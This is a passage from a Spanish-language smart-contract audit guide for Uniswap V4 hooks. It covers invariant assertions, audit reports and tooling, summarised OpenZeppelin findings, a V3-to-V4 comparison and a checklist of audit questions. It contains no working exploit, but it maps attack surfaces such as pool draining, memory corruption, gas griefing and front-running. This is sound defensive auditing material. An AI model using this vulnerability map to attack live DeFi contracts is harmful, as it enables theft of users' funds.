    IERC20(currency).balanceOf(address(poolManager))
);

// INV-HOOK-6: Fee efectivo nunca excede MAX_LP_FEE (1_000_000)
assert(effectiveFee <= 1_000_000);

// INV-HOOK-7: Pool state (sqrtPrice, liquidity, tick) es consistente
// antes y después de cada operación atómica
assert(isConsistentPoolState(sqrtPrice, tick, liquidity));

// INV-HOOK-8: El hook no debe poder llamar a funciones protegidas
// del PoolManager fuera de unlock() context
// (enforced por onlyWhenUnlocked modifier)

// INV-HOOK-9: currencyDelta para cada dirección es exactamente 0
// al final de unlock() para cada currency
assert(poolManager.currencyDelta(caller, currency) == 0);

// INV-HOOK-10: La suma de todos los deltas de hooks en una transacción
// debe ser contabilizada (no debe haber deltas fantasma)
assert(totalHookDeltas + totalCallerDeltas + totalPoolDeltas == 0);
```

---

## 5. Herramientas y Recursos

### Auditorías oficiales de Uniswap V4:
- **OpenZeppelin** — Uniswap V4 Core Audit (2024). 1 Critical, 2 Medium, 3 Low. [openzeppelin.com/news/uniswap-v4-core-audit]
- **Trail of Bits** — Uniswap V4 Security Review (2024-07). [github.com/trailofbits/publications/reviews/2024-07-uniswap-v4-core-securityreview.pdf]

### Código fuente clave:
- `src/PoolManager.sol` — Singleton que gestiona todos los pools, unlock/lock, flash accounting
- `src/libraries/Hooks.sol` — 14 permission flags, callHook, validateHookPermissions, delta validation
- `src/libraries/TransientStateLibrary.sol` — Transient storage para deltas, NonzeroDeltaCount, reserves
- `src/interfaces/IHooks.sol` — 10 hook callback interfaces
- `periphery/src/PositionManager.sol` — NFT positions, subscriber mechanism

### Tooling para testing de hooks:
- **HookMiner.sol** — Minado de addresses con bits específicos para permissions
- **Foundry fork testing** — vm.createFork() para testear hooks contra pools reales
- **Echidna/Medusa** — Fuzzing de invariantes con handlers que invocan hooks
- **Halmos** — Verificación simbólica de propiedades math en hooks

---

## 6. Resumen de Findings de Auditorías Oficiales

```yaml
# OpenZeppelin Uniswap V4 Core Audit (2024)
findings_oz:
  - severity: critical
    title: "ERC-20 Representation of Native Currency Can Drain Native Currency Pools"
    status: resolved
    relevancia_hooks: "Flash accounting — sync/settle explotable en chains con dual-address native tokens"

  - severity: medium
    title: "Unsafe Assembly Blocks"
    status: resolved
    relevancia_hooks: "Hook return data > 64 bytes corrompe free memory pointer"

  - severity: medium
    title: "ProtocolFeeController Gas Griefing"
    status: resolved
    relevancia_hooks: "Análogo a hooks que retornan datos enormes — memory expansion DoS"

  - severity: medium
    title: "Front-Running Pool Initialization or Initial Deposit"
    status: acknowledged
    relevancia_hooks: "beforeInitialize hook puede ejecutar lógica arbitraria durante init front-run"

  - severity: low
    title: "Unsafe ABI Encoding in Hooks.sol"
    status: resolved
    relevancia_hooks: "abi.encodeWithSelector sin type safety en llamadas a hooks"

  - severity: low
    title: "Unsafe Casting in Currency.fromId"
    status: resolved
    relevancia_hooks: "Upper bytes no limpiados en conversión currency↔ID"

  - severity: low
    title: "ERC-6909 Specification Discrepancy"
    status: resolved
    relevancia_hooks: "Transfer sin operator check cuando sender==caller"

  - severity: low
    title: "noDelegateCall Only on unlock()"
    status: resolved
    relevancia_hooks: "delegatecall bypass via custom contract replicating slot logic"
```

---

## 7. Diferencias Clave V3 → V4 para Auditors

| Aspecto | V3 | V4 |
|---------|----|----|
| Arquitectura | Factory + Pool por par | Singleton PoolManager |
| Hooks | No existen | 14 callbacks con permissions en address |
| Settlement | Transfer per operation | Flash accounting + transient storage |
| Reentrancia | Locked per operation | Permitida dentro de unlock() |
| Fees | Fijos (0.01%, 0.05%, 0.3%, 1%) | Dinámicos vía hooks |
| Claims | No existen | ERC-6909 internal tokens |
| Donación | No existe | donate() inyecta fees en ticks |
| Identidad del pool | token0/token1/fee | token0/token1/fee/tickSpacing/hooks |
| Oracle | Observations array en pool | Removido — hooks pueden implementar |
| Posiciones NFT | NonfungiblePositionManager | PositionManager con subscribers |

---

## 8. Preguntas Clave al Auditar un Protocolo sobre V4

1. **¿El protocolo usa hooks de terceros no auditados?** → Riesgo máximo
2. **¿Los hooks tienen flags RETURNS_DELTA?** → Pueden robar fondos del caller
3. **¿Los hooks son proxy upgradeable?** → La implementación puede cambiar
4. **¿El protocolo valida hookData antes de pasarlo?** → Inyección posible
5. **¿El protocolo maneja native currency en chains con dual-address?** → Exploit de OZ
6. **¿Los hooks interactúan con ERC-6909 claims?** → Superficie de ataque nueva
7. **¿El protocolo asume que fees son fijos?** → Hook puede overridear fees
8. **¿Los hooks almacenan estado por pool?** → ¿Aislamiento correcto?
9. **¿El hook puede bloquear operaciones (removeLiquidity, liquidaciones)?** → DoS
10. **¿El protocolo lee precio del pool (slot0)?** → Manipulable dentro de unlock()
